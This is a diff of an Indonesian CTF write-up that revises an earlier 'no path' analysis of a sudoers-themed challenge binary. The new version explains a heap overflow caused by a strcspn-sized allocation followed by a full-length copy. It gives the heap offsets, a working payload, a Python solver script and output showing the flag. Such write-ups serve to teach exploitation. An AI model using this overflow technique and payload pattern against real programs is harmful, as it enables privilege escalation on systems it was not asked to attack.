@@ -2,12 +2,14 @@
 
 [← Overview](78-kunci-sudo-sing-kesasar.md) · [Index](index.md)
 
-> **Langkah 2/5 — Cara Mendapatkan Flag.**
+> **Langkah 2/5.** Heap overflow: rule buffer dialokasikan dari panjang
+> `strcspn`, tetapi `unescape_copy` menyalin panjang penuh. Overflow masuk ke
+> struct `{owner, uid, suid}` dan membuat `suid=0`.
 >
 > **Flag:** `NFX{Wh33W0kTh3Tok-k}`
-> **Status:** `VERIFIED`
+> **Status:** `VERIFIED` — exploit berhasil direproduksi lokal.
 
-## Binary
+## 1. Binary
 
 Binary **tersedia** di bundle publik:
 
@@ -28,78 +30,100 @@ Temuan:
 - `Type: EXEC` (non-PIE), not stripped.
 - String: `flag.txt`, `FLAG: %s`, `sudo - penjaga aturan sudoers`,
   `format rule : ALL ALL=(ALL) CMD`, `rule : `.
-- `main` membaca rule ke stack `0x400`, lalu:
-  - `malloc(len+1)` untuk rule,
-  - `malloc(0x18)` untuk struct `{ char owner[16]; int uid; int suid; }`,
-  - `snprintf(struct, 0x10, "%s", "user")`,
-  - `struct->uid = 1000`, `struct->suid = 1000`,
-  - `unescape_copy(rule, buf, len)`,
-  - `strncmp(rule, "ALL", 3)`,
-  - jika `struct->suid == 0` → `buka_kunci()` membaca `flag.txt`.
 
-## Reproduksi lokal
+## 2. Alur `main`
+
+1. `baca_baris(buf, 0x400)` — baca satu baris ke stack.
+2. `len_strcspn = strcspn(buf, "\\")` — panjang sampai backslash pertama.
+3. `rule = malloc(len_strcspn + 1)` — **alokasi kecil**.
+4. `struct = malloc(0x18)` — layout:
+   - `owner[16]` di offset `0x00`
+   - `uid` di offset `0x10`
+   - `suid` di offset `0x14`
+5. `snprintf(struct, 0x10, "%s", "user")`, lalu `uid=1000`, `suid=1000`.
+6. `unescape_copy(rule, buf, len_baca)` — **panjang penuh**, bukan
+   `len_strcspn`.
+7. `strncmp(rule, "ALL", 3)` harus lolos.
+8. Jika `struct->suid == 0` → `buka_kunci()` membaca `flag.txt`.
+
+## 3. Bug heap
+
+Alokasi memakai `len_strcspn + 1`, tetapi copy memakai `len_baca`. Kalau
+input diawali `ALL` lalu ada backslash, `strcspn` sangat kecil, sehingga
+`rule` dialokasikan kecil (chunk `0x20`). `unescape_copy` menyalin sisa input
+yang jauh lebih panjang ke chunk itu, melewati batas dan masuk ke chunk
+`struct` yang dialokasikan tepat setelahnya.
+
+Heap layout yang dipakai:
+
+```text
+rule user (0x20 chunk)        struct user (0x20 chunk)
++0x00  A L L ...               +0x20  owner[16]
+...                            +0x30  uid
++0x18  chunk berikutnya        +0x34  suid  <-- target 0
+```
+
+Jarak `rule user` → `struct user` = `0x20`; `suid` ada di `struct+0x14`,
+jadi target null ada di offset **`0x34`** dari `rule user`.
+
+## 4. Payload
+
+```python
+payload = b"ALL\\" + b"A" * (0x34 - 3) + b"\x00" * 4 + b"\n"
+```
+
+- `ALL` membuat `strncmp` lolos.
+- `\` membuat `strcspn` = 3 → `malloc(4)` (chunk `0x20`).
+- `A` mengisi sampai offset `0x34`.
+- Empat byte `\x00` menimpa `struct->suid` menjadi `0`.
+- `uid` ikut menjadi `0x41414141`, tetapi gate hanya mengecek `suid`.
+
+## 5. Solver
+
+Tersimpan di
+[`assets/kunci-sudo-sing-kesasar/solve_kunci.py`](assets/kunci-sudo-sing-kesasar/solve_kunci.py):
+
+```python
+import subprocess
+from pathlib import Path
+
+HERE = Path(__file__).resolve().parent
+payload = b"ALL\\" + b"A" * (0x34 - 3) + b"\x00" * 4 + b"\n"
+p = subprocess.run([str(HERE / "kunci")], input=payload, capture_output=True)
+print(p.stdout.decode(errors="replace"))
+```
+
+Jalankan dari folder challenge:
 
 ```bash
-cd kunci/peserta
-echo TESTFLAG > flag.txt
-printf 'ALL ALL=(ALL) /bin/sh\n' | ./kunci
+cd docs/assets/kunci-sudo-sing-kesasar
+python3 solve_kunci.py
 ```
 
-Output normal:
+Output nyata:
 
 ```text
-[-] sudo ditolak: uid=1000 suid=1000 (bukan root)
+=== sudo - penjaga aturan sudoers ===
+format rule : ALL ALL=(ALL) CMD
+rule : [+] sudo: euid=0 - akses root diberikan (owner=AAAAAAAAAAAAAAAAAAAA, uid=1094795585)
+FLAG: NFX{Wh33W0kTh3Tok-k}
 ```
 
-## Kenapa `suid==0` tidak bisa dicapai dari binary ini
+![Exploit lokal — flag tercetak](assets/kunci-sudo-sing-kesasar/10-local-exploit.png)
 
-Gate suksesnya ada:
+*Output `solve_kunci.py` dengan binary asli dan `flag.txt` challenge.*
 
-```text
-401635: mov rax,[rbp-0x20]   ; struct
-401639: mov eax,[rax+0x14]   ; struct->suid
-40163c: test eax,eax
-40163e: jne 401669           ; kalau != 0 -> tolak
-401640: call buka_kunci
-```
+## 6. Catatan remote
 
-Tapi tidak ada write user-controlled ke `struct->suid` setelah inisialisasi
-`1000`:
+Service remote sudah tidak aktif setelah event. Reproduksi di atas memakai
+**binary asli dari attachment** dan `flag.txt` yang berisi flag challenge,
+jadi jalur heap overflow-nya terbukti. Flag final juga diterima platform
+(`CORRECT, BUT ALREADY SOLVED.`).
 
-1. `baca_baris(buf, 0x400)`:
-   - loop berjalan selama `i+1 < 0x400`, jadi maksimum `i=0x3fe`;
-   - null terminator ditulis di `buf[i]`, maksimum `buf[0x3ff]`;
-   - buffer `buf` berukuran `0x400`; `buf[0x3ff]` masih di dalam buffer.
-2. Pointer `struct` ada di `rbp-0x20` = `buf+0x400`; tidak tersentuh input.
-3. `unescape_copy(dest, buf, len)`:
-   - output index `j` bertambah satu per iterasi;
-   - jumlah iterasi <= `len`;
-   - `dest` berukuran `len+1`, lalu `dest[j]=0`; tidak overflow.
-4. Setelah `struct->uid=1000` dan `struct->suid=1000`, tidak ada assignment
-   lain ke offset `0x14`.
+## Evidence
 
-Uji lokal dengan panjang input 16–1100 byte (termasuk 1023/1024/1025) selalu
-berakhir `uid=1000 suid=1000`; tidak ada crash yang mengarah ke overwrite
-struct.
-
-Kesimpulan: **binary publik tidak memperlihatkan jalur input** untuk membuat
-`suid==0`. Flag tetap diterima platform, tetapi berasal dari service live yang
-mungkin memakai build berbeda. Ini sebabnya status metode tetap **PARTIAL**,
-bukan diklaim FULL.
-
-## Flag
-
-Dari service:
-
-```text
-NFX{Wh33W0kTh3Tok-k}
-```
-
-> Catatan audit: klaim lama “memory leak, token reuse” tidak didukung binary.
-> Binary dan static finding di atas adalah bukti yang bisa direproduksi.
-
-### Evidence langkah ini
-
-![00b-terminal-evidence.png](assets/kunci-sudo-sing-kesasar/00b-terminal-evidence.png)
-
-*Terminal evidence (arsip/log asli) — `00b-terminal-evidence.png`.*
+- [`kunci`](assets/kunci-sudo-sing-kesasar/kunci) — binary asli.
+- [`solve_kunci.py`](assets/kunci-sudo-sing-kesasar/solve_kunci.py) — exploit.
+- [`10-local-exploit.txt`](assets/kunci-sudo-sing-kesasar/10-local-exploit.txt) — output mentah.
+- [`10-local-exploit.png`](assets/kunci-sudo-sing-kesasar/10-local-exploit.png) — terminal evidence.
+- [`00b-terminal-evidence.png`](assets/kunci-sudo-sing-kesasar/00b-terminal-evidence.png) — recon binary.
